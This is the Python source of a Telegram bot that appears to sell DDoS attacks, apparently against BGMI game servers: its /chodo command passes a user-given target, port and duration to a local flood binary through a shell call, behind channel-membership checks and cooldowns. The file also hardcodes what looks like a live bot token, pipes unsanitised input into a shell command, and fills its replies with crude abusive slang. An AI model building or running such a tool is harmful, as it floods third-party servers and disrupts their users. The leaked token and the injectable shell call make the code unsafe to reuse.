import telebot
import subprocess
import threading
import time
import os
import copy

# Old Bot Token
BOT_TOKEN = "8187175703:AAHzPK8If6V3LO2_WBu004xX_P5l8yOjkOM"
bot = telebot.TeleBot(BOT_TOKEN)

# Admin user IDs
admin_id = {"5599402910"}

# Old Allowed Group **(String ke roop me)**
ALLOWED_GROUPS = {"-1002382674139"}

# Required Channels
REQUIRED_CHANNELS = ["@BADMOSH100"]

# Cooldown Dictionary (Group ke base pe)
attack_cooldown = {}

# Cooldown Time (in seconds)
COOLDOWN_TIME = 123  # 2 minutes


# Function to check if user is a member of required channels
def is_member(user_id):
    for channel in REQUIRED_CHANNELS:
        try:
            member_status = bot.get_chat_member(channel, user_id)
            if member_status.status not in ["member", "administrator", "creator"]:
                return False
        except Exception:
            return False
    return True


# Handler for /joined command (to verify channel membership)
@bot.message_handler(commands=["joined"])
def verify_membership(message):
    user_id = message.from_user.id

    if is_member(user_id):
        bot.reply_to(message, "✅ You have joined https://t.me/BADMOSH100 . Now you can use the bot.", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ You have not joined https://t.me/BADMOSH100 . Please join {', '.join(REQUIRED_CHANNELS)} first.", parse_mode="Markdown")


# Function to start the attack
def start_attack(target, port, duration, message):
    try:
        # Send start message as reply
        bot.reply_to(message, f"✅ Chudai started on {target}:{port} for {duration} seconds.\n⚠️ Jabtak ye attack run krrha hai, to iske bichme koi attack na daalo bhenchod.")
        
        # Absolute path ka use karo
        attack_command = f"{os.path.abspath('./2112')} {target} {port} {duration} 800"
        process = subprocess.Popen(attack_command, shell=True)
        process.wait()

        # Send completion message as reply
        bot.reply_to(message, f"✅ Chudai completed on {target}:{port} for {duration} second. PLEASE SENDS SCREENSHOT.")

    except Exception as e:
        bot.reply_to(message, f"❌ Error while starting attack: {e}")


# Handler for /chodo command (attack)
@bot.message_handler(commands=["chodo"])
def handle_attack(message):
    global attack_cooldown

    user_id = message.from_user.id
    chat_id = str(message.chat.id)  # **chat_id ko string me convert kiya**

    current_time = time.time()

    # Check if bot is in an allowed group
    if chat_id not in ALLOWED_GROUPS:
        bot.reply_to(message, "❌ Group me USE kr idhar MAA kiu Chudane Aya hai.")
        return

    # Check if user is a member of both required channels
    if not is_member(user_id):
        bot.reply_to(message, f"❌ You must join https://t.me/BADMOSH100 {', '.join(REQUIRED_CHANNELS)} before using this command .", parse_mode="Markdown")
        return

    # **Cooldown Group Ke Base Pe Lagao** ✅
    if chat_id in attack_cooldown and current_time - attack_cooldown[chat_id] < COOLDOWN_TIME:
        remaining_time = int(COOLDOWN_TIME - (current_time - attack_cooldown[chat_id]))
        bot.reply_to(message, f"⏳ Group is on cooldown. Please wait {remaining_time} seconds before using /chodo again.")
        return

    # Parse command arguments
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /chodo <target> <port> <time>")
        return

    target, port, duration = command_parts[1], command_parts[2], command_parts[3]

    try:
        port = int(port)
        duration = int(duration)

        if duration > 123:
            bot.reply_to(message, "❌ Error: Time interval must be less than 123 seconds.")
            return

        # **Cooldown ko Group ID ke base pe update karo** ✅
        attack_cooldown[chat_id] = current_time

        # **Deep copy message object** to avoid threading issue
        message_copy = copy.deepcopy(message)

        # Start attack in background thread
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message_copy))
        thread.start()

    except ValueError:
        bot.reply_to(message, "❌ Error: Port and time must be numbers.")

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''
💥 /chodo : 😫BGMI WALO KI MAA KO CHODO🥵. 

Regards :- @BADMOSH_X_GYRANGE
Official Channel :- https://t.me/BADMOSH100
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🔥Gyrange ke LODE pe aapka swagat hai, {user_name}! Sabse acche se bgmi ki maa behen yahi hack karta hai. Kharidne ke liye Kira se sampark karein.
🤗Try To Run This Command : /help 
💵BUY :-@BADMOSH_X_GYRANGE'''
    bot.reply_to(message, response)

# Start the bot
try:
    bot.polling(none_stop=True)
except Exception as e:
    print(f"Error: {e}") 